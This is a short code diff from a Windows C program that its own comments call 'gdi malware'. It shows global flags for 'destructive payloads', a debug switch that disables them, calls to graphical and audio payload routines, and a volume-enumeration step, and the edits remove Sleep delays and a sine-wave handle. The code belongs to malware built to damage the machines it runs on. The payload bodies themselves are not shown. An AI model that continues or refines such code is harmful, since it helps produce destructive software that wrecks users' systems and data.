@@ -14,9 +14,8 @@ but remember......
 gdi malware makes people lose braincells and iq..... :) 
 */
 
-ULONG g_uRngSeed = 0; // seed for RtlUniform
+ULONG g_uRngSeed = 0; // seed for RtlRandom
 INT g_iGDIPayloadCount = 0; //max 6
-HANDLE g_hSineWave = NULL;
 BOOL g_bDebug = FALSE; // enable/disable destructive payloads
 
 VOID WINAPI fnSetSeedRNG(VOID) {
@@ -37,7 +36,7 @@ INT WINAPI WinMain (
 ) {
 	UNREFERENCED_PARAMETER(hPrevInstance); // to not get warnings about unused variables
 	fnSetSeedRNG();
-	
+
 	// if debug is set true by cmdline argument, the destructive payloads would be disabled
 	INT iArgAmount = 0;
 	LPWSTR *pszCommandLineArgs = CommandLineToArgvW(
@@ -101,7 +100,6 @@ INT WINAPI WinMain (
 					0, 
 					NULL
 					);
-
 			
 			CreateThread(
 				NULL, 
@@ -195,8 +193,6 @@ VOID WINAPI fnEssentialpayloads(VOID) {
 
 			//Start finding the volumes
 			fnFindVolumes();
-
-			Sleep(9000);
 } 
 
 VOID WINAPI fnGraphicalpayloads(VOID) {
@@ -230,8 +226,6 @@ VOID WINAPI fnAudiopayloads(VOID) {
 		0,
 		NULL
 		);
-
-	Sleep(2000);
 
 	fnNoise2();
 	fnNoise1();
